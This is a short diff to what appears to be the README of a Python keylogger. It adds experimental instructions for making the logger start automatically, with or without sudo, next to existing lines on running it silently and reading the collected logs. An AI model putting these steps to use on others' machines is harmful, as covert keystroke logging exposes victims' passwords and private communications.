@@ -12,3 +12,14 @@ Run silently with:
 View collected logs with:
 
 ```python keylogger.py speak```
+
+
+[Experimental]
+
+Autostart:
+
+```python keylogger.py autostart```
+or
+```sudo python keylogger.py autostart```
+
+(Don't run as root otherwise)
